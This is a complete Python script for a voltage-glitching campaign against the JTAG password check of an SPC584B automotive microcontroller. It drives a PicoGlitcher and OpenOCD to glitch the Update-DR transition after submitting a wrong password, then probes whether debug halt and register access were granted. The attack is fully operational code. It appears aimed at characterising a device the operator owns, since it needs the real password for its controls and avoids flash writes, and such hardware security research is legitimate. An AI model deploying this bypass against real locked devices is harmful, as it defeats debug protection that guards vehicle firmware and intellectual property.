#!/usr/bin/env python3
"""Glitch the SPC584B JTAG password check at Update-DR.

Each attempt resets the target, shifts one known-wrong password to DRPAUSE,
glitches the transition into DRUPDATE, and probes debug access without another
reset. The script never writes flash, UTEST, DCF, lifecycle, or OTP.
"""

from __future__ import annotations

import argparse
from collections import deque
from dataclasses import dataclass
from datetime import datetime
import hashlib
from importlib.metadata import version as package_version
import json
import os
from pathlib import Path
import random
import re
import shutil
import socket
import sqlite3
import stat
import struct
import subprocess
import sys
import threading
import time

from findus import PicoGlitcher
from findus.pyboard import PyboardError


SCRIPT_DIR = Path(__file__).resolve().parent
EXPECTED_IDCODE = 0x20144041
PASS_LCSTAT = 0xF7FF4000
PASSWORD_SIZE = 32
PASSWORD_INSTRUCTION = 0x07
RPC_TOKEN = b"\x1a"
TRIGGER_TIMEOUT_MARKER = "Function execution timed out!"
TRIGGER_EDGE_COUNT = 2
HALT_RECOVERY_TIMEOUTS_MS = (100, 200, 250, 300, 500, 1000, 2000)
MANIFEST_SCHEMA = 1
INVALID_STATES = frozenset({"PROBE_ERROR", "TRIGGER_TIMEOUT"})
DATABASE_SCHEMA = (
    "CREATE TABLE experiments ("
    "id INTEGER PRIMARY KEY, "
    "delay INTEGER NOT NULL, "
    "length INTEGER NOT NULL, "
    "repeat_index INTEGER NOT NULL, "
    "color TEXT NOT NULL, "
    "response BLOB NOT NULL, "
    "UNIQUE (delay, length, repeat_index))"
)

EXIT_NO_ACCESS = 0
EXIT_ERROR = 2
EXIT_ACCESS = 10


class OpenOCDError(RuntimeError):
    pass


@dataclass(frozen=True)
class Result:
    state: str
    color: str
    detail: str

    @property
    def access_observed(self) -> bool:
        return self.state.startswith("ACCESS_")


GridPoint = tuple[int, int, int]


class CampaignDatabase:
    """Minimal transactional result store with resume-safe constraints."""

    def __init__(self, path: Path, *, create: bool):
        if create:
            path.parent.mkdir(parents=True, exist_ok=True)
            try:
                path.touch(mode=0o600, exist_ok=False)
            except FileExistsError as error:
                raise ValueError(f"database already exists: {path}") from error
        elif not path.is_file():
            raise ValueError(f"resume database does not exist: {path}")

        self.connection = sqlite3.connect(path)
        try:
            if create:
                self.connection.execute(DATABASE_SCHEMA)
                self.connection.commit()
            else:
                self._validate_schema()
        except Exception:
            self.connection.close()
            raise

    def _validate_schema(self) -> None:
        integrity = self.connection.execute("PRAGMA integrity_check").fetchone()
        if integrity != ("ok",):
            raise ValueError(f"database integrity check failed: {integrity!r}")
        schema = self.connection.execute(
            "SELECT sql FROM sqlite_master "
            "WHERE type = 'table' AND name = 'experiments'"
        ).fetchone()
        if schema != (DATABASE_SCHEMA,):
            raise ValueError("resume database has an incompatible schema")

    @staticmethod
    def _encode_result(result: Result) -> bytes:
        return json.dumps(
            {"detail": result.detail, "state": result.state},
            sort_keys=True,
            separators=(",", ":"),
        ).encode()

    @staticmethod
    def decode_state(response: bytes) -> str:
        try:
            decoded = json.loads(bytes(response).decode())
        except (UnicodeDecodeError, json.JSONDecodeError, TypeError) as error:
            raise ValueError("database contains a partial result row") from error
        if (
            not isinstance(decoded, dict)
            or set(decoded) != {"detail", "state"}
            or not isinstance(decoded["detail"], str)
            or not isinstance(decoded["state"], str)
        ):
            raise ValueError("database contains a partial result row")
        return decoded["state"]

    def rows(self) -> list[tuple[int, int, int, int, bytes]]:
        return self.connection.execute(
            "SELECT id, delay, length, repeat_index, response "
            "FROM experiments ORDER BY id"
        ).fetchall()

    def insert(self, identifier: int, point: GridPoint, result: Result) -> None:
        delay, length, repeat_index = point
        with self.connection:
            self.connection.execute(
                "INSERT INTO experiments "
                "(id, delay, length, repeat_index, color, response) "
                "VALUES (?, ?, ?, ?, ?, ?)",
                (
                    identifier,
                    delay,
                    length,
                    repeat_index,
                    result.color,
                    self._encode_result(result),
                ),
            )

    def close(self) -> None:
        self.connection.close()


class OpenOCDSession:
    """Run OpenOCD and exchange commands through its local Tcl socket."""

    def __init__(self, executable: str, adapter_speed_khz: int):
        self.executable = executable
        self.adapter_speed_khz = adapter_speed_khz
        self.port = reserve_local_port()
        self.process: subprocess.Popen[str] | None = None
        self.sock: socket.socket | None = None
        self.output: deque[str] = deque(maxlen=2000)
        self.halted = False
        self.resume_on_close = True

    def command_line(self) -> list[str]:
        commands = [
            "bindto 127.0.0.1",
            "adapter driver ftdi",
            "ftdi vid_pid 0x263d 0x4001",
            "ftdi channel 0",
            "ftdi layout_init 0x0008 0x000b",
            "ftdi layout_signal nTRST -data 0x0100 -oe 0x0100",
            "ftdi layout_signal nSRST -ndata 0x2000 -oe 0x2000",
            f"adapter speed {self.adapter_speed_khz}",
            "transport select jtag",
            "reset_config trst_and_srst",
            (
                "jtag newtap spc584b tap -irlen 6 "
                f"-expected-id 0x{EXPECTED_IDCODE:08x}"
            ),
            "target create spc584b.cpu powerpc -endian big -chain-position spc584b.tap",
            "gdb_port disabled",
            "telnet_port disabled",
            f"tcl_port {self.port}",
        ]
        command = [self.executable]
        for item in commands:
            command.extend(("-c", item))
        return command

    def collect_output(self) -> None:
        assert self.process is not None and self.process.stdout is not None
        for line in self.process.stdout:
            self.output.append(line)

    def __enter__(self) -> "OpenOCDSession":
        self.process = subprocess.Popen(
            self.command_line(),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        threading.Thread(target=self.collect_output, daemon=True).start()

        try:
            deadline = time.monotonic() + 10
            while time.monotonic() < deadline:
                if self.process.poll() is not None:
                    raise OpenOCDError(
                        "OpenOCD exited during startup:\n" + "".join(self.output)
                    )
                try:
                    self.sock = socket.create_connection(
                        ("127.0.0.1", self.port), timeout=0.5
                    )
                    self.sock.settimeout(10)
                    break
                except OSError:
                    time.sleep(0.05)
            else:
                raise OpenOCDError("timed out waiting for OpenOCD")

            self.command("init")
            return self
        except Exception:
            self.close()
            raise

    def rpc(self, script: str) -> str:
        if self.sock is None:
            raise OpenOCDError("OpenOCD Tcl connection is unavailable")
        self.sock.sendall(script.encode() + RPC_TOKEN)
        chunks: list[bytes] = []
        while True:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise OpenOCDError("OpenOCD closed the Tcl connection")
            if RPC_TOKEN in chunk:
                before, _, _ = chunk.partition(RPC_TOKEN)
                chunks.append(before)
                return b"".join(chunks).decode(errors="replace")
            chunks.append(chunk)

    def command(self, command: str, error_label: str | None = None) -> str:
        response = self.rpc(
            f"set __spc_rc [catch {{{command}}} __spc_msg]; "
            "list $__spc_rc $__spc_msg"
        ).strip()
        match = re.match(r"^(-?\d+)(?:\s+(.*))?$", response, re.DOTALL)
        if not match:
            raise OpenOCDError(f"unexpected OpenOCD response: {response!r}")
        message = (match.group(2) or "").strip()
        if len(message) >= 2 and message[0] == "{" and message[-1] == "}":
            message = message[1:-1]
        if match.group(1) != "0":
            raise OpenOCDError(
                f"OpenOCD command failed: {error_label or command}\n{message}"
            )
        return message

    def read_word(self, address: int) -> int:
        response = self.command(f"read_memory 0x{address:08x} 32 1")
        words = re.findall(r"(?:0x[0-9a-fA-F]+)|(?:\b[0-9]+\b)", response)
        if len(words) != 1:
            raise OpenOCDError(
                f"read at 0x{address:08x} returned {len(words)} words"
            )
        return int(words[0], 0) & 0xFFFFFFFF

    def close(self) -> None:
        if self.sock is not None:
            if self.halted and self.resume_on_close:
                try:
                    self.command("resume")
                except Exception:
                    pass
            try:
                self.rpc("shutdown")
            except Exception:
                pass
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

        if self.process is not None:
            try:
                self.process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                self.process.terminate()
                try:
                    self.process.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    self.process.kill()
            self.process = None

    def __exit__(self, exc_type: object, exc: object, traceback: object) -> None:
        self.close()


def reserve_local_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.bind(("127.0.0.1", 0))
        return int(listener.getsockname()[1])


def sha256_bytes(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def sha256_file(path: Path) -> str:
    try:
        with path.open("rb") as source:
            digest = hashlib.sha256()
            for chunk in iter(lambda: source.read(1024 * 1024), b""):
                digest.update(chunk)
    except OSError as error:
        raise OpenOCDError(f"cannot fingerprint {path}: {error}") from error
    return digest.hexdigest()


def find_openocd() -> str:
    configured = os.environ.get("SPC_OPENOCD")
    if not configured:
        raise OpenOCDError(
            "SPC_OPENOCD must point to ST's openocd-automotive-mcu-r1 build"
        )
    executable = shutil.which(configured)
    if executable is None:
        raise OpenOCDError(f"OpenOCD not found: {configured}")

    try:
        probe = subprocess.run(
            [executable, "-c", "target types", "-c", "shutdown"],
            capture_output=True,
            text=True,
            timeout=10,
            check=False,
        )
    except (OSError, subprocess.TimeoutExpired) as error:
        raise OpenOCDError(f"could not validate OpenOCD: {error}") from error
    if probe.returncode != 0:
        raise OpenOCDError(
            f"OpenOCD capability check exited with status {probe.returncode}"
        )
    if "powerpc" not in f"{probe.stdout}\n{probe.stderr}".split():
        raise OpenOCDError("SPC_OPENOCD does not provide the powerpc target")
    return executable


def openocd_identity(executable: str) -> dict[str, str]:
    try:
        probe = subprocess.run(
            [executable, "--version"],
            capture_output=True,
            text=True,
            timeout=10,
            check=False,
        )
    except (OSError, subprocess.TimeoutExpired) as error:
        raise OpenOCDError(f"could not identify OpenOCD: {error}") from error
    output = "\n".join(
        line.strip()
        for line in f"{probe.stdout}\n{probe.stderr}".splitlines()
        if line.strip()
    )
    if probe.returncode != 0 or not output:
        raise OpenOCDError(
            f"OpenOCD version check exited with status {probe.returncode}"
        )
    resolved = Path(executable).resolve()
    return {
        "path": str(resolved),
        "sha256": sha256_file(resolved),
        "version": output,
    }


def read_password(path: Path) -> bytes:
    try:
        password = path.read_bytes()
        mode = stat.S_IMODE(path.stat().st_mode)
    except OSError as error:
        raise OpenOCDError(f"cannot read password file {path}: {error}") from error
    if len(password) != PASSWORD_SIZE:
        raise OpenOCDError(f"password file must be exactly {PASSWORD_SIZE} bytes")
    if password in (b"\x00" * PASSWORD_SIZE, b"\xff" * PASSWORD_SIZE):
        raise OpenOCDError("refusing an all-zero or all-0xff password")
    if mode & 0o077:
        raise OpenOCDError(
            f"password file permissions are {mode:04o}; run: chmod 600 {path}"
        )
    return password


def wrong_password_words(password: bytes) -> tuple[int, ...]:
    wrong = bytearray(password)
    wrong[0] ^= 0x01
    return struct.unpack(">8I", wrong)


def reset_target(session: OpenOCDSession, hold_ms: int) -> None:
    session.command("irscan spc584b.tap 0x0e")
    session.command("drscan spc584b.tap 32 0x00000100")
    time.sleep(hold_ms / 1000)
    session.command("irscan spc584b.tap 0x0e")
    session.command("drscan spc584b.tap 32 0x00000000")


def shift_password_to_pause(
    session: OpenOCDSession, password_words: tuple[int, ...]
) -> None:
    if len(password_words) != 8:
        raise OpenOCDError("JTAG password must contain eight words")
    fields = " ".join(f"32 0x{word:08x}" for word in password_words)
    session.command(f"irscan spc584b.tap 0x{PASSWORD_INSTRUCTION:02x}")
    session.command(
        f"drscan spc584b.tap {fields} -endstate DRPAUSE",
        error_label="<redacted 256-bit JTAG password scan to DRPAUSE>",
    )


def compact_error(error: OpenOCDError) -> str:
    return " | ".join(line.strip() for line in str(error).splitlines() if line.strip())


def probe_debug(
    session: OpenOCDSession,
    halt_timeout_ms: int,
    recovery_timeouts_ms: tuple[int, ...] = (),
) -> Result:
    try:
        session.command("halt 0")
    except OpenOCDError as error:
        session.halted = False
        return Result("PROBE_ERROR", "M", compact_error(error))

    wait_errors: list[str] = []
    observed_at_ms: int | None = None
    timeouts = (halt_timeout_ms,) + tuple(
        timeout for timeout in recovery_timeouts_ms if timeout > halt_timeout_ms
    )
    for timeout_ms in timeouts:
        try:
            session.command(f"wait_halt {timeout_ms}")
            observed_at_ms = timeout_ms
            break
        except OpenOCDError as error:
            wait_errors.append(f"wait_halt_{timeout_ms}ms={compact_error(error)}")

    if observed_at_ms is None:
        session.halted = False
        return Result("HALT_NOT_OBSERVED", "G", ";".join(wait_errors))

    session.halted = True
    try:
        registers = session.command("get_reg -force {pc msr r0}")
        target_state = session.command("spc584b.cpu curstate")
        lcstat = session.read_word(PASS_LCSTAT)
    except OpenOCDError as error:
        return Result("ACCESS_UNVERIFIED", "O", compact_error(error))

    jun = 1 if lcstat & (1 << 30) else 0
    detail = (
        f"halt_wait_ms={observed_at_ms};registers={registers};state={target_state};"
        f"jun={jun};lc={lcstat & 0x7}"
    )
    if jun:
        return Result("ACCESS_JUN_SET", "R", detail)
    return Result("ACCESS_JUN_CLEAR", "M", detail)


def wait_for_trigger(glitcher: PicoGlitcher, timeout: float) -> bool:
    try:
        glitcher.block(timeout=timeout)
    except PyboardError as error:
        message = " ".join(
            item.decode(errors="replace") if isinstance(item, bytes) else str(item)
            for item in error.args
        )
        if TRIGGER_TIMEOUT_MARKER in message:
            return False
        raise
    return True


def prepare_password_submission(
    session: OpenOCDSession,
    password_words: tuple[int, ...],
    args: argparse.Namespace,
) -> None:
    reset_target(session, args.reset_hold_ms)
    session.halted = False
    shift_password_to_pause(session, password_words)


def run_attempt(
    session: OpenOCDSession,
    glitcher: PicoGlitcher,
    password_words: tuple[int, ...],
    delay: int,
    length: int,
    args: argparse.Namespace,
) -> Result:
    prepare_password_submission(session, password_words, args)
    glitcher.arm(delay, length)
    session.command("pathmove DRPAUSE DREXIT2 DRUPDATE RUN/IDLE")
    if not wait_for_trigger(glitcher, args.block_timeout):
        return Result("TRIGGER_TIMEOUT", "Y", TRIGGER_TIMEOUT_MARKER)
    recovery = HALT_RECOVERY_TIMEOUTS_MS if args.correct_password else ()
    return probe_debug(session, args.halt_timeout_ms, recovery)


def run_control_submission(
    session: OpenOCDSession,
    password_words: tuple[int, ...],
    args: argparse.Namespace,
    recover_halt: bool = False,
) -> Result:
    prepare_password_submission(session, password_words, args)
    session.command("pathmove DRPAUSE DREXIT2 DRUPDATE RUN/IDLE")
    recovery = HALT_RECOVERY_TIMEOUTS_MS if recover_halt else ()
    return probe_debug(session, args.halt_timeout_ms, recovery)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--rpico", required=True, help="Pico Glitcher serial port")
    parser.add_argument(
        "--password-file",
        required=True,
        type=Path,
        help="32-byte SPC584B JTAG password file",
    )
    parser.add_argument("--delay", nargs=2, type=int, default=(0, 1000))
    parser.add_argument("--length", nargs=2, type=int, default=(8, 28))
    parser.add_argument("--step-ns", type=int, default=4)
    parser.add_argument(
        "--attempts",
        type=int,
        default=0,
        help="desired total rows; 0 runs the complete repeated grid",
    )
    parser.add_argument(
        "--repeats-per-point",
        type=int,
        default=1,
        help="distinct repeated trials at every timing point (default: 1)",
    )
    parser.add_argument("--seed", type=int, default=584)
    parser.add_argument(
        "--controls",
        type=int,
        default=20,
        help="correct/wrong control pairs before and after the campaign (default: 20)",
    )
    parser.add_argument("--adapter-speed-khz", type=int, default=1000)
    parser.add_argument("--reset-hold-ms", type=int, default=50)
    parser.add_argument("--halt-timeout-ms", type=int, default=50)
    parser.add_argument("--block-timeout", type=float, default=2.0)
    parser.add_argument(
        "--correct-password",
        action="store_true",
        help="map where glitches disrupt a known-good password",
    )
    parser.add_argument(
        "--resume-database",
        type=Path,
        help="resume this database after exact manifest and prefix validation",
    )
    parser.add_argument("--no-store", action="store_true")
    return parser.parse_args()


def validate_args(args: argparse.Namespace) -> None:
    for name in ("delay", "length"):
        low, high = getattr(args, name)
        if low < 0 or high < low:
            raise ValueError(f"invalid --{name} range: {low} {high}")
    if args.step_ns <= 0:
        raise ValueError("--step-ns must be positive")
    if args.attempts < 0:
        raise ValueError("--attempts cannot be negative")
    if args.repeats_per_point <= 0:
        raise ValueError("--repeats-per-point must be positive")
    if args.controls < 0:
        raise ValueError("--controls cannot be negative")
    if args.resume_database is not None and args.no_store:
        raise ValueError("--resume-database cannot be combined with --no-store")
    if args.adapter_speed_khz <= 0 or args.halt_timeout_ms <= 0:
        raise ValueError("adapter speed and halt timeout must be positive")
    if args.reset_hold_ms < 0 or args.block_timeout <= 0:
        raise ValueError("invalid reset or trigger timeout")


def pio_tick_ns(frequency_hz: int) -> int:
    if frequency_hz <= 0 or 1_000_000_000 % frequency_hz:
        raise ValueError(f"unsupported PicoGlitcher frequency: {frequency_hz} Hz")
    return 1_000_000_000 // frequency_hz


def build_grid(args: argparse.Namespace) -> list[GridPoint]:
    def values(bounds: tuple[int, int]) -> range:
        low, high = bounds
        first = ((low + args.step_ns - 1) // args.step_ns) * args.step_ns
        return range(first, high + 1, args.step_ns)

    grid = [
        (delay, length, repeat_index)
        for delay in values(tuple(args.delay))
        for length in values(tuple(args.length))
        for repeat_index in range(args.repeats_per_point)
    ]
    if not grid:
        raise ValueError("grid has no points inside the requested ranges")
    random.Random(args.seed).shuffle(grid)
    if len(grid) != len(set(grid)):
        raise ValueError("grid contains duplicate timing/repeat tuples")
    return grid


def grid_sha256(grid: list[GridPoint]) -> str:
    encoded = json.dumps(grid, separators=(",", ":")).encode()
    return sha256_bytes(encoded)


def build_manifest(
    args: argparse.Namespace,
    grid: list[GridPoint],
    password: bytes,
    openocd: dict[str, str],
    pico_firmware_version: list[int],
    frequency_hz: int,
    tick_ns: int,
) -> dict[str, object]:
    return {
        "schema": MANIFEST_SCHEMA,
        "method": (
            "correct_password_sensitivity"
            if args.correct_password
            else "one_bit_wrong_password"
        ),
        "timing": {
            "delay_ns": list(args.delay),
            "length_ns": list(args.length),
            "step_ns": args.step_ns,
        },
        "repeats_per_point": args.repeats_per_point,
        "seed": args.seed,
        "controls": args.controls,
        "edge_count": TRIGGER_EDGE_COUNT,
        "reset_jtag": {
            "adapter_speed_khz": args.adapter_speed_khz,
            "block_timeout_seconds": args.block_timeout,
            "expected_idcode": f"0x{EXPECTED_IDCODE:08x}",
            "halt_recovery_timeouts_ms": list(HALT_RECOVERY_TIMEOUTS_MS),
            "halt_timeout_ms": args.halt_timeout_ms,
            "password_instruction": f"0x{PASSWORD_INSTRUCTION:02x}",
            "reset_hold_ms": args.reset_hold_ms,
            "trigger_edge": "rising",
            "trigger_input": "default",
            "transport": "jtag",
        },
        "grid_points": len(grid),
        "grid_sha256": grid_sha256(grid),
        "password_sha256": sha256_bytes(password),
        "source_sha256": sha256_file(Path(__file__).resolve()),
        "openocd": openocd,
        "pico": {
            "firmware_version": pico_firmware_version,
            "pio_frequency_hz": frequency_hz,
            "pio_tick_ns": tick_ns,
        },
        "findus_version": package_version("findus"),
    }


def manifest_path(database_path: Path) -> Path:
    return database_path.with_suffix(database_path.suffix + ".manifest.json")


def write_manifest(path: Path, manifest: dict[str, object]) -> None:
    if path.exists():
        raise ValueError(f"manifest already exists: {path}")
    temporary = path.with_name(f".{path.name}.tmp-{os.getpid()}-{time.time_ns()}")
    encoded = json.dumps(manifest, sort_keys=True, separators=(",", ":")) + "\n"
    try:
        with temporary.open("x", encoding="utf-8") as output:
            os.chmod(temporary, 0o600)
            output.write(encoded)
            output.flush()
            os.fsync(output.fileno())
        os.replace(temporary, path)
    finally:
        try:
            temporary.unlink()
        except FileNotFoundError:
            pass


def require_manifest_match(
    database_path: Path, expected: dict[str, object]
) -> None:
    path = manifest_path(database_path)
    try:
        actual = json.loads(path.read_text(encoding="utf-8"))
    except FileNotFoundError as error:
        raise ValueError(f"resume manifest does not exist: {path}") from error
    except (OSError, json.JSONDecodeError) as error:
        raise ValueError(f"cannot read resume manifest {path}: {error}") from error
    if actual != expected:
        keys = sorted(
            key
            for key in set(actual if isinstance(actual, dict) else ()) | set(expected)
            if not isinstance(actual, dict) or actual.get(key) != expected.get(key)
        )
        detail = ",".join(keys) or "document"
        raise ValueError(f"resume manifest mismatch: {detail}")


def new_database_path() -> Path:
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    return SCRIPT_DIR / "databases" / f"spc584b_password_glitch_{stamp}.sqlite"


def expected_campaign_state(args: argparse.Namespace) -> str:
    return "ACCESS_JUN_SET" if args.correct_password else "HALT_NOT_OBSERVED"


def validate_resume_prefix(
    database: CampaignDatabase,
    grid: list[GridPoint],
    expected_state: str,
) -> int:
    rows = database.rows()
    if len(rows) > len(grid):
        raise ValueError("resume database has more rows than the configured grid")
    for expected_id, row in enumerate(rows):
        identifier, delay, length, repeat_index, response = row
        if identifier != expected_id:
            raise ValueError(
                f"resume database IDs are not a contiguous prefix at {expected_id}"
            )
        if (delay, length, repeat_index) != grid[expected_id]:
            raise ValueError(
                f"resume database diverges from the shuffled grid at {expected_id}"
            )
        state = CampaignDatabase.decode_state(response)
        if state != expected_state:
            raise ValueError(
                f"resume database row {expected_id} is not safely resumable: {state}"
            )
    return len(rows)


def prepare_database(
    args: argparse.Namespace,
    manifest: dict[str, object],
    grid: list[GridPoint],
) -> tuple[CampaignDatabase | None, Path | None, int]:
    if args.no_store:
        return None, None, 0

    if args.resume_database is not None:
        path = args.resume_database.expanduser().resolve()
        require_manifest_match(path, manifest)
        database = CampaignDatabase(path, create=False)
        try:
            start = validate_resume_prefix(
                database, grid, expected_campaign_state(args)
            )
        except Exception:
            database.close()
            raise
        return database, path, start

    path = new_database_path()
    database = CampaignDatabase(path, create=True)
    try:
        write_manifest(manifest_path(path), manifest)
    except Exception:
        database.close()
        raise
    return database, path, 0


def fresh_control_submission(
    openocd: str,
    password_words: tuple[int, ...],
    args: argparse.Namespace,
    *,
    preserve_access: bool,
    recover_halt: bool = False,
) -> Result:
    with OpenOCDSession(openocd, args.adapter_speed_khz) as session:
        session.command("poll off")
        result = run_control_submission(
            session, password_words, args, recover_halt=recover_halt
        )
        if preserve_access and result.access_observed:
            session.resume_on_close = False
        return result


def fresh_glitch_submission(
    openocd: str,
    glitcher: PicoGlitcher,
    password_words: tuple[int, ...],
    point: GridPoint,
    args: argparse.Namespace,
) -> Result:
    delay, length, _ = point
    with OpenOCDSession(openocd, args.adapter_speed_khz) as session:
        session.command("poll off")
        result = run_attempt(session, glitcher, password_words, delay, length, args)
        if (
            result.access_observed
            and result.state != expected_campaign_state(args)
        ):
            session.resume_on_close = False
        return result


def best_effort_print(message: str, *, stderr: bool = False) -> None:
    try:
        print(message, file=sys.stderr if stderr else sys.stdout, flush=True)
    except Exception:
        pass


def report_access(source: str, identifier: int | None, point: GridPoint | None) -> None:
    fields = [f"source={source}"]
    if identifier is not None:
        fields.append(f"attempt={identifier}")
    if point is not None:
        delay, length, repeat_index = point
        fields.extend(
            (
                f"delay_ns={delay}",
                f"length_ns={length}",
                f"repeat_index={repeat_index}",
            )
        )
    best_effort_print(f"CAMPAIGN_RESULT=ACCESS_OBSERVED {' '.join(fields)}")
    best_effort_print("DEVICE_LEFT_WITHOUT_ADDITIONAL_RESET=yes")


def run_controls(
    phase: str,
    count: int,
    openocd: str,
    correct_words: tuple[int, ...],
    wrong_words: tuple[int, ...],
    args: argparse.Namespace,
) -> int | None:
    for pair in range(count):
        correct = fresh_control_submission(
            openocd,
            correct_words,
            args,
            preserve_access=False,
            recover_halt=True,
        )
        print(
            f"CONTROL phase={phase} pair={pair} password=correct "
            f"result={correct.state} detail={correct.detail}",
            flush=True,
        )
        wrong = fresh_control_submission(
            openocd, wrong_words, args, preserve_access=True
        )
        if wrong.access_observed:
            report_access(f"{phase}_wrong_control", None, None)
            return EXIT_ACCESS
        print(
            f"CONTROL phase={phase} pair={pair} password=wrong "
            f"result={wrong.state} detail={wrong.detail}",
            flush=True,
        )
        if correct.state != "ACCESS_JUN_SET":
            print(
                f"CAMPAIGN_RESULT=ERROR reason={phase}_correct_control_"
                f"{correct.state}",
                file=sys.stderr,
                flush=True,
            )
            return EXIT_ERROR
        if wrong.state != "HALT_NOT_OBSERVED":
            print(
                f"CAMPAIGN_RESULT=ERROR reason={phase}_wrong_control_{wrong.state}",
                file=sys.stderr,
                flush=True,
            )
            return EXIT_ERROR
    return None


def store_result(
    database: CampaignDatabase | None,
    identifier: int,
    point: GridPoint,
    result: Result,
) -> None:
    if database is not None:
        database.insert(identifier, point, result)


def run_campaign(
    openocd: str,
    glitcher: PicoGlitcher,
    password_words: tuple[int, ...],
    grid: list[GridPoint],
    start: int,
    total: int,
    args: argparse.Namespace,
    database: CampaignDatabase | None,
) -> int:
    started = time.monotonic()
    for identifier in range(start, total):
        point = grid[identifier]
        delay, length, repeat_index = point
        result = fresh_glitch_submission(
            openocd, glitcher, password_words, point, args
        )

        if result.state in INVALID_STATES:
            print(
                f"ATTEMPT={identifier} delay_ns={delay} length_ns={length} "
                f"repeat_index={repeat_index} result={result.state} "
                f"detail={result.detail}",
                flush=True,
            )
            print(
                f"CAMPAIGN_RESULT=ERROR reason={result.state}",
                file=sys.stderr,
                flush=True,
            )
            return EXIT_ERROR

        expected_state = expected_campaign_state(args)
        if result.access_observed and result.state != expected_state:
            report_access("campaign", identifier, point)
            try:
                store_result(database, identifier, point, result)
            except Exception as error:
                best_effort_print(
                    f"DATABASE_ERROR_AFTER_ACCESS={type(error).__name__}:{error}",
                    stderr=True,
                )
            return EXIT_ACCESS

        rate = (identifier - start + 1) / max(
            time.monotonic() - started, 0.001
        )
        print(
            f"ATTEMPT={identifier} delay_ns={delay} length_ns={length} "
            f"repeat_index={repeat_index} result={result.state} "
            f"rate={rate:.2f}/s detail={result.detail}",
            flush=True,
        )

        if args.correct_password and result.state != "ACCESS_JUN_SET":
            print(
                f"CAMPAIGN_RESULT=CORRECT_PASSWORD_DISRUPTED "
                f"attempt={identifier} delay_ns={delay} length_ns={length} "
                f"repeat_index={repeat_index} result={result.state}",
                flush=True,
            )
            try:
                store_result(database, identifier, point, result)
            except Exception as error:
                print(
                    f"DATABASE_ERROR_AFTER_CANDIDATE={type(error).__name__}:{error}",
                    file=sys.stderr,
                    flush=True,
                )
            return EXIT_ACCESS

        if not args.correct_password and result.state != "HALT_NOT_OBSERVED":
            print(
                f"CAMPAIGN_RESULT=ERROR reason=unexpected_{result.state}",
                file=sys.stderr,
                flush=True,
            )
            return EXIT_ERROR

        store_result(database, identifier, point, result)

    return EXIT_NO_ACCESS


def main() -> int:
    args = parse_args()
    database: CampaignDatabase | None = None
    try:
        validate_args(args)
        openocd = find_openocd()
        openocd_details = openocd_identity(openocd)
        password = read_password(args.password_file)
        correct_words = struct.unpack(">8I", password)
        wrong_words = wrong_password_words(password)

        glitcher = PicoGlitcher()
        try:
            glitcher.init(port=args.rpico, enable_vtarget=False)
        except SystemExit as error:
            raise RuntimeError(
                f"PicoGlitcher initialization exited with status {error.code}"
            ) from error

        frequency_hz = int(glitcher.get_cpu_frequency())
        tick_ns = pio_tick_ns(frequency_hz)
        if args.step_ns % tick_ns:
            raise ValueError(
                f"--step-ns must be a multiple of the Pico timing tick ({tick_ns} ns)"
            )
        glitcher.edge_count_trigger(
            pin_trigger="default",
            number_of_edges=TRIGGER_EDGE_COUNT,
            edge_type="rising",
        )
        glitcher.set_lpglitch()

        grid = build_grid(args)
        total = len(grid) if args.attempts == 0 else args.attempts
        if total > len(grid):
            raise ValueError(
                f"--attempts {total} exceeds the {len(grid)} unique repeated "
                "grid entries; increase --repeats-per-point"
            )

        pico_version = list(glitcher.pico_glitcher.get_firmware_version())
        manifest = build_manifest(
            args,
            grid,
            password,
            openocd_details,
            pico_version,
            frequency_hz,
            tick_ns,
        )
        database, database_path, start = prepare_database(args, manifest, grid)
        if start > total:
            raise ValueError(
                f"resume database already has {start} rows, beyond desired "
                f"--attempts total {total}"
            )

        method = (
            "CORRECT_PASSWORD_SENSITIVITY_MAP"
            if args.correct_password
            else "ONE_BIT_WRONG_PASSWORD_UPDATE_DR_GLITCH"
        )
        print(f"METHOD={method}", flush=True)
        print("TRIGGER=TCK_RISING_EDGE_2_UPDATE_DR_ENTRY_REFERENCE", flush=True)
        print(f"PICO_PIO_TICK_NS={tick_ns}", flush=True)
        print(f"SEED={args.seed}", flush=True)
        print(f"GRID_POINTS={len(grid)}", flush=True)
        print(f"REPEATS_PER_POINT={args.repeats_per_point}", flush=True)
        print(f"ATTEMPTS_TOTAL={total}", flush=True)
        print(f"RESUME_START={start}", flush=True)
        if database_path is not None:
            print(f"DATABASE={database_path}", flush=True)

        control_result = run_controls(
            "pre",
            args.controls,
            openocd,
            correct_words,
            wrong_words,
            args,
        )
        if control_result is not None:
            return control_result

        password_words = correct_words if args.correct_password else wrong_words
        campaign_result = run_campaign(
            openocd,
            glitcher,
            password_words,
            grid,
            start,
            total,
            args,
            database,
        )
        if campaign_result != EXIT_NO_ACCESS:
            return campaign_result

        control_result = run_controls(
            "post",
            args.controls,
            openocd,
            correct_words,
            wrong_words,
            args,
        )
        if control_result is not None:
            return control_result

        final = (
            "NO_CORRECT_PASSWORD_DISRUPTION"
            if args.correct_password
            else "NO_ACCESS_OBSERVED"
        )
        print(f"CAMPAIGN_RESULT={final}", flush=True)
        return EXIT_NO_ACCESS
    except KeyboardInterrupt:
        print("\nCAMPAIGN_RESULT=INTERRUPTED", flush=True)
        return 130
    except Exception as error:
        print(
            f"CAMPAIGN_RESULT=ERROR type={type(error).__name__} reason={error}",
            file=sys.stderr,
            flush=True,
        )
        return EXIT_ERROR
    finally:
        if database is not None:
            try:
                database.close()
            except Exception as error:
                best_effort_print(
                    f"DATABASE_CLOSE_ERROR={type(error).__name__}:{error}",
                    stderr=True,
                )


if __name__ == "__main__":
    raise SystemExit(main())
